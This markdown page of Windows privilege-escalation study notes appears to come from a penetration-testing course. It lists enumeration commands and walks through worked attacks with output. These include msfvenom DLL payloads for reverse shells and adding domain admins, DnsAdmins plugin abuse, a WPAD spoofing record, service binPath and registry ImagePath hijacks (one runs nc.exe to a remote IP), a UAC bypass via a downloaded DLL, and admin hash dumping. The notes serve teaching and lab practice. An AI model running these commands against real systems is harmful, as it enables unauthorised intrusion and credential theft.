---
layout: default
---
# Windows Priv Escalation

## Tools

[Seatbelt](https://github.com/GhostPack/Seatbelt) → C# project for performing a wide variety of local privilege escalation checks

[Pre-Compiled Binary](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)

[winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) → WinPEAS is a script that searches for possible paths to escalate privileges on Windows hosts. All of the checks are explained 

[PowerUp](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1) → PowerShell script for finding common Windows privilege escalation vectors that rely on misconfigurations. It can also be used to exploit some of the issues found

[SharpUp](https://github.com/GhostPack/SharpUp) →  C# version of PowerUp

[Pre-Compiled Binary](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)

[JAWS](https://github.com/411Hall/JAWS) →  PowerShell script for enumerating privilege escalation vectors written in PowerShell 2.0

[SessionGopher](https://github.com/Arvanaghi/SessionGopher) → SessionGopher is a PowerShell tool that finds and decrypts saved session information for remote access tools. It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information

[Watson](https://github.com/rasta-mouse/Watson) → Watson is a .NET tool designed to enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities.

[LaZagne](https://github.com/AlessandroZ/LaZagne) → Tool used for retrieving passwords stored on a local machine from web browsers, chat tools, databases, Git, email, memory dumps, PHP, sysadmin tools, wireless network configurations, internal Windows password storage mechanisms, and more

[Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng) → WES-NG is a tool based on the output of Windows' systeminfo utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities. Every Windows OS between Windows XP and Windows 10, including their Windows Server counterparts, is supported

Sysinternals Suite → We will use several tools from Sysinternals in our enumeration including [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk), [PipeList](https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist), and [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice)


> Note: Depending on how we gain access to a system we may not have many directories that are writeable by our user to upload tools. It is always a safe bet to upload tools to C:\Windows\Temp because the BUILTIN\Users group has write access.

## Getting lay of the Land

### **Situational Awareness**

#### Network Information

Interface(s), IP Address(es), DNS Information

```
C:\Users\> ipconfig /all
```
ARP Table

```
C:\Users\> arp -a
```
Routing Table

```
C:\Users\> route print
```
#### Enumerating Protections

Check Windows Defender Status

```
PS C:\Users\> Get-MpComputerStatus
```
List AppLocker Rules

```
PS C:\Users\> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

Test AppLocker Policy

```
PS C:\Users\> Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```

### **Initial Enumeration**

[Windows COmmand Reference](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands)

[Cheat Sheet](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#windows-version-and-configuration)

#### Key Data Points

* OS name: Knowing the type of Windows OS (workstation or server) and level (Windows 7 or 10, Server 2008, 2012, 2016, 2019, etc.) will give us an idea of the types of tools that may be available (such as the PowerShell version, or lack thereof on legacy systems. This would also identify the operating system version for which there may be public exploits availabl

* Version: As with the OS version, there may be public exploits that target a vulnerability in a specific version of Windows. Windows system exploits can cause system instability or even a complete crash. Be careful running these against any production system, and make sure you fully understand the exploit and possible ramifications before running one.

* Running Services: Knowing what services are running on the host is important, especially those running as NT AUTHORITY\SYSTEM or an administrator-level account. A misconfigurng in the context of a privileged account can be an easy win for privilege escalation

#### System Information

```
C:\Users\> tasklist /svc
```
**standard Windows processes**: Session Manager Subsystem (smss.exe), Client Server Runtime Subsystem (csrss.exe), WinLogon (winlogon.exe), Local Security Authority Subsystem Service (LSASS), and Service Host (svchost.exe)

#### Display All Environment Variables

```
C:\Users\> set
```
> when running a program, Windows looks for that program in the CWD (Current Working Directory) first, then from the PATH going left to right

> If a file is placed in USERPROFILE\AppData\Microsoft\Windows\Start Menu\Programs\Startup, when the user logs into a different machine, this file will execute

#### View Detailed Configuration Information

```
C:\Users\> systeminfo
```

> The System Boot Time and OS Version can also be checked to get an idea of the patch level

#### Patches and Updates

```
C:\Users\> wmic qfe
```

```
PS C:\> Get-HotFix | ft -AutoSize
```
> If systeminfo doesn't display hotfixes, they may be queriable with WMI using the WMI-Command binary with QFE (Quick Fix Engineering) to display patches

#### Installed Programs

```
C:\Users\> wmic product get name
```

```
PS C:\> Get-WmiObject -Class Win32_Product |  select Name, Version
```

#### Display Running Processes

```
PS C:\> netstat -ano

PS C:\> netstat -anoy
```
```
PS C:\Windows\system32> Get-Process -Id (Get-NetTCPConnection -LocalPort portnumber).OwningProcess             
```
> Service Listening On specific port
> Elevated Session may Required

#### User & Group Information

```
PS C:\Users\> query user
```
> Logged-In Users

```
C:\Users\ > echo %USERNAME%
```
> Current User

```
C:\> whoami /priv
```
> Current User Privileges

```
PS C:\Users\> whoami /groups
```
> Current User Group Information

```
PS C:\Users\> net user
```
> Get All Users

```
PS C:\Users\> net localgroup
```
> Get All Groups

```
PS C:\Users\> net localgroup administrators
```
> Details About a Group

```
PS C:\Users\> net accounts
```
> Get Password Policy

### **Communication WIth Processes**

#### Listing Named Pipes with Pipelist

```
C:\> pipelist.exe /accepteula
```

> Listing Named Pipes with PowerShell

```
PS C:\>  gci  \\.\pipe\
```

> Reviewing LSASS Named Pipe Permissions

```
C:\> accesschk.exe /accepteula \\.\Pipe\lsass -v
```

#### Named Pipes Attack Example

```
C:\> accesschk.exe -w \pipe\* -v
```
 
> WindscribeService named pipe allows READ and WRITE access to the Everyone group, meaning all authenticated users.

```
C:\> accesschk.exe -accepteula -w \pipe\WindscribeService -v
```

## Windows Group Privileges

### **Event Log Readers**

Administrators or members of the Event Log Readers group have permission to access this log

```
C:\> net localgroup "Event Log Readers"
```
Reference Guide to all Built-IN Windows commands [here](https://download.microsoft.com/download/5/8/9/58911986-D4AD-4695-BF63-F734CD4DF8F2/ws-commands.pdf)

We can query Windows events from the command line using the [wevtutil](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil) utility and the [Get-WinEvent](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent?view=powershell-7.1)  PowerShell cmdlet.

#### Searching Security Logs Using wevtutil

```
PS C:\> wevtutil qe Security /rd:true /f:text | Select-String "/user"
```
#### Passing Credentials to wevtutil

```
C:\> wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
 ```

####  Searching Security Logs Using Get-WinEvent

```
PS C:\> Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```

> Searching the Security event log with Get-WinEvent requires administrator access or permissions adjusted on the registry key HKLM\System\CurrentControlSet\Services\Eventlog\Security. Membership in just the Event Log Readers group is not sufficient.

### **DNS ADMINS**

Members of the DnsAdmins group have access to DNS information on the network. The Windows DNS service supports custom plugins and can call functions from them to resolve name queries that are not in the scope of any locally hosted DNS zones. The DNS service runs as NT AUTHORITY\SYSTEM, so membership in this group could potentially be leveraged to escalate privileges on a Domain Controller or in a situation where a separate server is acting as the DNS server for the domain. It is possible to use the built-in [dnscmd](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd) utility to specify the path of the plugin DLL



*  DNS management is performed over RPC
  
*  ServerLevelPluginDll allows us to load a custom DLL with zero verification of the DLL's path. This can be done with the dnscmd tool from the command line
    
*  When a member of the DnsAdmins group runs the dnscmd command below, the HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll registry key is populated
    
*  When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)
    
*  An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.

#### Leveraging DnsAdmins Access

##### Generating Malicious DLL

malicious DLL to add a user to the domain admins group using msfvenom

```
attacker@linux: msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

##### Loading DLL as Non-Privileged User

Moving File to the victim machine then using the dnscmd utility to load a custom DLL with a non-privileged user

```
C:\> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
DNS Server failed to reset registry property.
    Status = 5 (0x00000005)
Command failed: ERROR_ACCESS_DENIED
```
> As expected, attempting to execute this command as a normal user isn't successful. Only members of the DnsAdmins group are permitted to do this.

##### Loading DLL as Member of DnsAdmins

```
C:\> Get-ADGroupMember -Identity DnsAdmins

distinguishedName : CN=netadm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
name              : netadm
objectClass       : user
objectGUID        : 1a1ac159-f364-4805-a4bb-7153051a8c14
SamAccountName    : netadm
SID               : S-1-5-21-669053619-2741956077-1013132368-1109  
```

##### Loading Custom DLL

```
C:\> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```
> We must specify the full path to our custom DLL or the attack will not work properly

Only the dnscmd utility can be used by members of the DnsAdmins group, as they do not directly have permission on the registry key.
Membership in the DnsAdmins group doesn't give the ability to restart the DNS service, the DLL will be loaded the next time the DNS service is started

#### Finding User's SID
If we do not have access to restart the DNS server, we will have to wait until the server or service restarts. Let's check our current user's permissions on the DNS service.
 
```
C:\> wmic useraccount where name="netadm" get sid
```
 
##### Checking Permissions on DNS Service
 
```
C:\> sc.exe sdshow DNS
```
 
> [this](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/) article can be used to read SDDL syntax
 
#### Stop and Start the DNS Service
 
If our user has **RPWP** permissions which translate to **SERVICE_START** and **SERVICE_STOP**  we can issue the following commands to stop and start the service
 
```
C:\> sc stop dns
```
 
```
C:\> sc start dns
```
 
##### Confirming Group Membership
 
If all goes to plan, our account will be added to the Domain Admins group or receive a reverse shell if our custom DLL was made to give us a connection back
 
```
C:\> net group "Domain Admins" /dom 
```
 
#### Cleaning Up
 
**Making configuration changes and stopping/restarting the DNS service on a Domain Controller are very destructive actions and must be exercised with great care**

> These steps must be taken from an elevated console with a local or domain admin account.

#### Confirming Registry Key Added

The first step is confirming that the ServerLevelPluginDll registry key exists. Until our custom DLL is removed, we will not be able to start the DNS service again correctly

```
C:\> reg query \\<ip>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
```
##### Deleting Registry Key

C:\> reg delete \\<ip>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll
 
##### Starting the DNS Service Again and Checking status
 
```
C:\> sc.exe start dns
 
C:\> sc query dns
```
 
#### Creating a WPAD Record
 
Another way to abuse DnsAdmins group privileges is by creating a WPAD record. Membership in this group gives us the rights to disable global query block security, which by default blocks this attack
After disabling the global query block list and creating a WPAD record, every machine running WPAD with default settings will have its traffic proxied through our attack machine.
We could use a tool such as Responder or Inveigh to perform traffic spoofing, and attempt to capture password hashes and crack them offline or perform an SMBRelay attack
 
 
##### Disabling the Global Query Block List
 
```
C:\> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.AD.local
```

##### Adding a WPAD Record

```
C:\> Add-DnsServerResourceRecordA -Name wpad -ZoneName AD.local -ComputerName dc01.AD.local -IPv4Address 10.10.14.3
```

### **Server Operators**

The Server Operators group allows members to administer Windows servers without needing assignment of Domain Admin privileges. It is a very highly privileged group that can log in locally to servers, including Domain Controllers.

Membership of this group confers the powerful **SeBackupPrivilege** and **SeRestorePrivilege** privileges and the ability to control local services

#### Querying the Service

```
C:\> sc qc <service name>
```

#### Checking Service Permissions with PsService

We can use the service viewer/controller [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice), which is part of the Sysinternals suite, to check permissions on the service.

```
C:\> c:\Tools\PsService.exe security <Service name>
```
 **SERVICE_ALL_ACCESS** access right  gives us full control over the service.

#### Modifying the Service Binary Path and Starting the Service

```
C:\> sc config <service name> binPath= "cmd /c net localgroup Administrators <user> /add"
C:\> sc start <service Name>
```

#### Confirming Local Admin Group Membership

```
C:\> net localgroup Administrators
```

#### Dumping Admin hash

Once we Are member of Admin Group We can dump hashes of admin

```
attacker@ubuntu[/]$  secretsdump.py <user>@<ip> -just-dc-user administrator
``` 

## Attacking the OS

### **User Account Control**

User Account Control (UAC) is a feature that enables a consent prompt for elevated activities. Applications have different integrity levels, and a program with a high level can perform tasks that could potentially compromise the system. When UAC is enabled, applications and tasks always run under the security context of a non-administrator account unless an administrator explicitly authorizes these applications/tasks to have administrator-level access to the system to run

#### Confirming Admin Group Membership

```
C:\> net localgroup administrators
```

#### Reviewing User Privileges

```
C:\> whoami /priv
```

#### Confirming UAC is Enabled

```
C:\> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1
```
#### Checking UAC level

```
C:\> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
> The value of ConsentPromptBehaviorAdmin is 0x5, which means the highest UAC level of Always notify is enabled. There are fewer UAC bypasses at this highest level.

#### Checking Windows Version

UAC bypasses leverage flaws or unintended functionality in different Windows builds. Let's examine the build of Windows we're looking to elevate on.

```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
This returns the build version 14393, which using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page we cross-reference to Windows release 1607

> The [UACME](https://github.com/hfiref0x/UACME) project maintains a list of UAC bypasses, including information on the affected Windows build number, the technique used, and if Microsoft has issued a security update to fix it.

#### Reviewing Path Variable

```
PS C:\> cmd /c echo %PATH%

C:\Windows\system32;
C:\Windows;
C:\Windows\System32\Wbem;
C:\Windows\System32\WindowsPowerShell\v1.0\;
C:\Users\sarah\AppData\Local\Microsoft\WindowsApps;
``` 
We can potentially bypass UAC in this by using DLL hijacking by placing a malicious srrstr.dll DLL to WindowsApps folder, which will be loaded in an elevated context.

#### Generating Malicious srrstr.dll DLL

```
Attacker@kali[/kali]$ msfvenom -p windows/shell_reverse_tcp LHOST=<ip addr> LPORT=<port> -f dll > srrstr.dll

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of dll file: 5120 bytes
```

#### Downloading DLL Target

```
PS C:\>curl http://<ip>/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```

#### Executing SystemPropertiesAdvanced.exe on Target Host

```
C:\> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

### **Weak Permissions**

Permissions on Windows systems are complicated and challenging to get right. A slight modification in one place may introduce a flaw elsewhere. Services usually install with SYSTEM privileges, so leveraging a service permissions-related flaw can often lead to complete control over the target system

#### Permissive File System ACLs

##### Running SharpUp

We can use [SharpUp](https://github.com/GhostPack/SharpUp/) from the GhostPack suite of tools to check for service binaries suffering from weak ACLs.

```
PS C:\> .\SharpUp.exe audit

=== SharpUp: Running Privilege Escalation Checks ===


=== Modifiable Service Binaries ===

  Name             : SecurityService
  DisplayName      : PC Security Management Service
  Description      : Responsible for managing PC security
  State            : Stopped
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```
The tool identifies the PC Security Management Service, which executes the SecurityService.exe binary when started

##### Checking Permissions with icacls
```
PS C:\> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"

C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users:(I)(F)
                                                     Everyone:(I)(F)
                                                     NT AUTHORITY\SYSTEM:(I)(F)
                                                     BUILTIN\Administrators:(I)(F)
                                                     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```
Using icacls we can verify the vulnerability and see that the EVERYONE and BUILTIN\Users groups have been granted full permissions to the directory, and therefore any unprivileged system user can manipulate the directory and its contents

##### Replacing Service Binary

This service is also startable by unprivileged users, so we can make a backup of the original binary and replace it with a malicious binary generated with msfvenom. It can give us a reverse shell as SYSTEM, or add a local admin user and give us full administrative control over the machine.
```
C:\> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
C:\> sc start SecurityService
```

#### Weak Service Permissions

##### Reviewing sharpup again
```
C:\> SharpUp.exe audit
 
=== SharpUp: Running Privilege Escalation Checks ===
 
 
=== Modifiable Services ===
 
  Name             : WindscribeService
  DisplayName      : WindscribeService
  Description      : Manages the firewall and controls the VPN tunnel
  State            : Running
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"
```
> the WindscribeService is potentially misconfigured.
  
##### Checking Permissions with AccessChk

we'll use [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) from the Sysinternals suite to enumerate permissions on the service. The flags we use, in order, are **-q (omit banner)**, **-u (suppress errors)**, **-v (verbose)**, **-c (specify name of a Windows service)**, and **-w (show only objects that have write access)**. Here we can see that all Authenticated Users have [SERVICE_ALL_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) rights over the service,which means full read/write control over it
 
```
 C:\htb> accesschk.exe /accepteula -quvcw WindscribeService
 
Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com
 
WindscribeService
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS
```

##### Check Local Admin Group

```
C:\> net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain
 
Members
 
-------------------------------------------------------------------------------
Administrator
mrb3n
The command completed successfully.
```

##### Changing the Service Binary Path

```
C:\> sc config WindscribeService binpath="cmd /c net localgroup administrators admin2 /add"

[SC] ChangeServiceConfig SUCCESS
```

##### Stopping Service

```
C:\> sc stop WindscribeService
 
SERVICE_NAME: WindscribeService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x4
        WAIT_HINT          : 0x0
```
we must stop the service, so the new binpath command will run the next time it is started

##### Starting the Service
```
C:\> sc start WindscribeService

[SC] StartService FAILED 1053:
 
The service did not respond to the start or control request in a timely fashion.
```
Since we have full control over the service, we can start it again, and the command we placed in the binpath will run even though an error message is returned. The service fails to start because the binpath is not pointing to the actual service executable. Still, the executable will run when the system attempts to start the service before erroring out and stopping the service again, executing whatever command we specify in the binpath.

##### Confirming Local Admin Group Addition
```
C:\> net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain
 
Members
 
-------------------------------------------------------------------------------
Administrator
admin2
mrb3n
The command completed successfully.
```

#### Unquoted Service Path

When a service is installed, the registry configuration specifies a path to the binary that should be executed on service start. If this binary is not encapsulated within quotes, Windows will attempt to locate the binary in different folders

##### Service Binary Path

```
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```
Windows will decide the execution method of a program based on its file extension, so it's not necessary to specify it. Windows will attempt to load the following potential executables in order on servicestart, with a .exe being implied:

* C:\Program
* C:\Program Files
* C:\Program Files (x86)\System
* C:\Program Files (x86)\System Explorer\service\SystemExplorerService64

##### Querying Service

```
C:\> sc qc SystemExplorerHelpService

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: SystemExplorerHelpService
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Explorer Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```
If we can create the following files, we would be able to hijack the service binary and gain command execution in the context of the service, in this case, NT AUTHORITY\SYSTEM.

* C:\Program.exe\
* C:\Program Files (x86)\System.exe

**creating files in the root of the drive or the program files folder requires administrative privileges. Even if the system had been misconfigured to allow this, the user probably wouldn't be able to restart the service and would be reliant on a system restart to escalate privileges. Although it's not uncommon to find applications with unquoted service paths, it isn't often exploitable**

##### Searching for Unquoted Service Paths

```
C:\> wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```
 
#### Permissive Registry ACLs
 
It is also worth searching for weak service ACLs in the Windows Registry. We can do this using **accesschk**.
 
##### Checking for Weak Service ACLs in Registry
 
```
C:\> accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services

Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

RW HKLM\System\CurrentControlSet\services\ModelManagerService
        KEY_ALL_ACCESS

<SNIP> 
```

##### Changing ImagePath with PowerShell
We can abuse this using the PowerShell cmdlet Set-ItemProperty to change the ImagePath value

```
PS C:\> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```

#### Modifiable Registry Autorun Binary

#### Check Startup Programs

We can use WMIC to see what programs run at system startup. Suppose we have write permissions to the registry for a given binary or can overwrite a binary listed. In that case, we may be able to escalate privileges to another user the next time that the user logs in

```
PS C:\> Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl

Name     : OneDrive
command  : "C:\Users\mrb3n\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background
Location : HKU\S-1-5-21-2374636737-2633833024-1808968233-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : WINLPE-WS01\mrb3n

Name     : Windscribe
command  : "C:\Program Files (x86)\Windscribe\Windscribe.exe" -os_restart
Location : HKU\S-1-5-21-2374636737-2633833024-1808968233-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : WINLPE-WS01\mrb3n

Name     : SecurityHealth
command  : %windir%\system32\SecurityHealthSystray.exe
Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : Public

Name     : VMware User Process
command  : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : Public

Name     : VMware VM3DService Process
command  : "C:\WINDOWS\system32\vm3dservice.exe" -u
Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : Public
```
> This [post](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries) and this [site](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2) detail many potential autorun locations on Windows systems 

### **Vulnerable Services**
#### Enumerating Installed Programs

```
C:\> wmic product get name

Name
Druva inSync 6.6.3
```

#### Enumerating Local Ports

```
C:\> netstat -anoy

 TCP    127.0.0.1:6064         0.0.0.0:0              LISTENING       3324
```

#### Enumerating Process ID

Map the process ID (PID) 3324 back to the running process.

```
PS C:\> get-process -Id 3324

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    149      10     1512       6748              3324   0 inSyncCPHwnet64

```

#### Enumerating Running Service

```
PS C:\> get-service | ? {$_.DisplayName -like 'Druva*'}

Status   Name               DisplayName
------   ----               -----------
Running  inSyncCPHService   Druva inSync Client Service
```

